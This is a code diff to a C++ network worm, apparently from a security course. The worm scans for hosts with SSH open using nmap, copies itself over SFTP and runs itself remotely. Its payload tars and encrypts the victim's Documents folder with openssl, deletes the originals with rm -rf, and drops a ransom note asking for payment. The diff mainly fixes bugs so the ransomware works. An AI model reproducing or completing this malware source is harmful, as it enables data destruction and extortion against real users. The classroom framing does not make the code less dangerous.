@@ -25,6 +25,7 @@
 #include <fcntl.h>
 #include <libgen.h>
 #include <limits.h>
+#include <pwd.h>
 
 /*******************************************************************************
  * Define sections
@@ -258,6 +259,13 @@ Iface getMyActiveIP() {
 vector<string> getHostsOnTheSameNetwork(const Iface host) {
 
     string nmapFile = "/tmp/nmap.txt";
+    char NMAP[] = "/usr/bin/nmap";
+    struct stat fileBuff;
+
+    if ( stat(NMAP, &fileBuff) != 0) {
+        perror("getHostsOnTheSameNetwork: cannot find /usr/bin/nmap\n");
+        exit(-1);
+    }
 
     // We will fork a child and use it to run nmap
     // Expected that the nmap program is available on the system
@@ -277,7 +285,7 @@ vector<string> getHostsOnTheSameNetwork(const Iface host) {
         // Run nmap program against the CIDR string for:
         // port 22 with open status
         // output in greppable format in a file called /tmp/nmap.txt
-        if (execlp("/usr/bin/nmap", "nmap", host.cidr.c_str(), "-p 22", "--open", "-oG", nmapFile.c_str(), NULL) < 0) {
+        if (execlp(NMAP, "nmap", host.cidr.c_str(), "-p 22", "--open", "-oG", nmapFile.c_str(), NULL) < 0) {
             perror("getHostsOnTheSameNetwork: execlp failed child");
             exit(-1);
         };
@@ -517,6 +525,9 @@ int spreadFile(ssh_session &sshClient, char *source, char *target) {
     // We want to Open the file to Write Only, and Truncate if already exist
     int access_type = O_WRONLY | O_CREAT | O_TRUNC;
 
+    printf("Source file: %s\n", source);
+    printf("Target file: %s\n", target);
+
     // Create a sftp session
     sftp_session sftp = sftp_new(sshClient);
 
@@ -549,10 +560,11 @@ int spreadFile(ssh_session &sshClient, char *source, char *target) {
     }
 
     // Write the data from source to target
-    char buffer[1024];
+    const int SIZE = 1024;
+    char buffer[SIZE] = {0};
     int readByte, writeByte;
     while (!feof(localFile)) {
-        if ( (readByte = fread(buffer, sizeof(char), 1024, localFile)) < 0 ) {
+        if ( (readByte = fread(buffer, sizeof(char), SIZE, localFile)) < 0 ) {
             perror("spreadFile: Error reading local file\n");
             return -1;
         }
@@ -616,6 +628,9 @@ int remoteExecute(ssh_session &sshClient, char *cmd) {
     }
 
     // if we get here it means the command execute successfully
+    // We will close the channel and free before return
+    ssh_channel_close(ssh);
+    ssh_channel_free(ssh);
     return 0;
 
 }
@@ -629,9 +644,9 @@ int remoteExecute(ssh_session &sshClient, char *cmd) {
  ******************************************************************************/
 int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
     // Determine the worm location and its base name
-    char sourceName[PATH_MAX];
-    char destName[PATH_MAX];
-    char command[1024];
+    char sourceName[PATH_MAX] = {0};
+    char destName[PATH_MAX] = {0};
+    char command[1024] = {0};
 
     // Determine the full path of the worm file
     if (readlink("/proc/self/exe", sourceName, PATH_MAX) == -1) {
@@ -640,7 +655,7 @@ int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
     }
 
     // Build out the worm destination path and name
-    sprintf(destName, "%s%s", "/tmp/", basename(sourceName));
+    sprintf(destName, "/tmp/%s", basename(sourceName));
 
     // Spread the file
     if (spreadFile(sshClient, sourceName, destName) != 0) {
@@ -649,14 +664,14 @@ int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
     }
 
     // We want to allow read/execute to file for all chmod a+rx
-    sprintf(command, "%s%s", "chmod a+rx ", destName);
+    sprintf(command, "chmod a+rx %s", destName);
     if (remoteExecute(sshClient, command) != 0) {
         perror("spreadAndExecute: failed chmod the worm\n");
         return -1;
     }
 
     // Now we tell it to execute
-    sprintf(command, "%s %s %s %s", "nohup", destName, fromHost.c_str(), " >/tmp/nohup.out 2>&1 &");
+    sprintf(command, "nohup %s %s >/tmp/nohup.out 2>&1 &", destName, fromHost.c_str());
     if (remoteExecute(sshClient, command) != 0) {
         perror("spreadAndExecute: failed execute the worm\n");
         return -1;
@@ -673,8 +688,14 @@ int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
  ******************************************************************************/
 int tarBallFile(const string path, const string name) {
 
-    char *tarOpts = "-czvf";
+    char tarOpts[] = "-czvf";
+    char TAR[] = "/bin/tar";
     struct stat fileBuff;
+
+    if ( stat(TAR, &fileBuff) != 0) {
+        perror("tarBallFile: cannot find /bin/tar program\n");
+        exit(-1);
+    }
 
     // We need to fork to call the tar command
     pid_t pid = fork();
@@ -688,7 +709,7 @@ int tarBallFile(const string path, const string name) {
         close(1);
         close(2);
         // Run the tar command to tar up the Documents folder
-        if (execlp("/usr/bin/tar", "tar", tarOpts, name.c_str(), path.c_str(), NULL) < 0) {
+        if (execlp(TAR, "tar", tarOpts, name.c_str(), path.c_str(), NULL) < 0) {
             perror("tarBallFile: execlp failed child");
             exit(-1);
         };
@@ -717,9 +738,9 @@ int tarBallFile(const string path, const string name) {
  ******************************************************************************/
 int encryptFile(const string source, const string target) {
 
-    char *OPENSSL = "/usr/bin/openssl";
+    char OPENSSL[] = "/usr/bin/openssl";
     struct stat fileBuff;
-    char *password = "cs456worm";
+    char password[] = "cs456worm";
 
     // Check to make sure openssl exists
     if ( stat(OPENSSL, &fileBuff) != 0) {
@@ -770,6 +791,14 @@ int encryptFile(const string source, const string target) {
  ******************************************************************************/
 int removePath(const string path) {
 
+    struct stat fileBuff;
+    char RM[] = "/bin/rm";
+
+    if ( stat(RM, &fileBuff) != 0) {
+        perror("removePath: cannot find /bin/rm program\n");
+        exit(-1);
+    }
+
     // We need to fork to call the tar command
     pid_t pid = fork();
     if (pid < 0) {
@@ -782,7 +811,7 @@ int removePath(const string path) {
         close(1);
         close(2);
         // Run command to encrypt it
-        if (execlp("/bin/rm", "rm", "-rf", path.c_str(), NULL) < 0 ) {
+        if (execlp(RM, "rm", "-rf", path.c_str(), NULL) < 0 ) {
             perror("removePath: execlp failed child");
             exit(-1);
         };
@@ -811,11 +840,13 @@ int removePath(const string path) {
  ******************************************************************************/
 int compressEncryptDelete(const string path) {
 
-    char *tarName = NULL;
-    char *encryptName = NULL;
+    char tarName[PATH_MAX] = {0};
+    char encryptName[PATH_MAX] = {0};
+    char pathName[PATH_MAX] = {0};
 
     // Turn the tar name into something like ~/Documents.tar
-    sprintf(tarName, "~/%s.tar.gz", basename(path.c_str()) );
+    sprintf(pathName, "%s", path.c_str());
+    sprintf(tarName, "%s/%s.tar.gz", dirname(pathName), basename(pathName));
     sprintf(encryptName, "%s.bonus.enc", tarName);
 
 
@@ -827,8 +858,9 @@ int compressEncryptDelete(const string path) {
         perror("compressEncryptDelete: encryptFile failed\n");
         return -1;
     } else {
-        // We were able to tarball the file and encrypt it and left a ransom
-        // note.  Do clean up
+        // We were able to tarball the file and encrypt it. Do clean up
+        // by remove the main tar file as well as the directory that we
+        // tar/encrypted
         if (remove(tarName) < 0) {
             perror("compressEncryptDelete: unable to remove tar name\n");
             return -1;
@@ -845,15 +877,22 @@ int compressEncryptDelete(const string path) {
  * Function: leaveRansomNote
  * @param N/A
  * @return 0 if success or -1 if failed
+ *
  ******************************************************************************/
 int leaveRansomNote() {
     // Function attempt to leave a ransom file on the user desktop
     string msg;
-    FILE *fp = fopen("~/Desktop/randomNoteBonus.txt", "w");
-    if (!fp) {
-        perror("leaveRansomNote: Unable to open ransomFile\n");
-        return -1;
-    }
+    char ransomFile[MAX_PATH];
+    struct passwd *user = NULL;
+
+    // We will first get the user with getuid() then get the struct of
+    // passwd file for that user.  We can find the home directory at pw_dir
+    // http://stackoverflow.com/questions/2910377/get-home-directory-in-linux-c
+    user = getpwuid(getuid());
+
+    // We will build out the path for the ransomFile
+    // expected it will be something like /home/ubuntu/Desktop/ransomBonus.txt
+    sprintf(ransomFile, "%s/Desktop/ransomBonus.txt", user->pw_dir);
 
     msg = "Your files had been pwned with encryption !\n";
     msg += "To get it back, you will need to purchase the key from moi\n\n";
@@ -862,6 +901,13 @@ int leaveRansomNote() {
     msg += "Attach the recorded file and email to getmykey@cpsc456.info\n";
     msg += "Once verify you will get the key to decrypt the files\n";
     msg += "Adios !\n";
+
+    // Open the file for writing
+    FILE *fp = fopen(ransomFile, "w");
+    if (!fp) {
+        perror("leaveRansomNote: Unable to open ransomFile\n");
+        return -1;
+    }
 
     // Write the message
     if (fwrite(msg.c_str(), sizeof(char), msg.length(), fp) < 0 ) {
@@ -880,8 +926,12 @@ int leaveRansomNote() {
  * @return 0 if success or -1 if failed
  ******************************************************************************/
 int performExtorting() {
-    // We will extort a static directory
-    char *docDir = "/home/ubuntu/Documents/";
+
+    char docDir[PATH_MAX];
+    struct passwd *user = getpwuid(getuid());
+
+    // build the docDir to something like /home/ubuntu/Documents/
+    sprintf(docDir, "%s/Documents/", user->pw_dir);
 
     // We perform the actual malicious activity here
     // Since the openssl program from the web does not work, we will be using
@@ -913,6 +963,7 @@ int main (int argc, const char **argv) {
     {
         // If the Local System has not been mark as master, mark it
         if (! isLocalSystemInfected() ) {
+            printf("Marking system as hacker system\n");
             // Mark the system as master
             markSystemAsMaster();
         }
@@ -925,13 +976,13 @@ int main (int argc, const char **argv) {
             exit(0);
         } else {
             string fromHost = argv[1];
-
+            printf("Extorting ....\n");
             // Perform malicious
             if (performExtorting() < 0) {
                 perror("Have problem extorting \n");
                 exit(-1);
             };
-
+            printf("Marked system as infected\n");
             // Mark the system
             markSystemAsInfected(fromHost);
         }
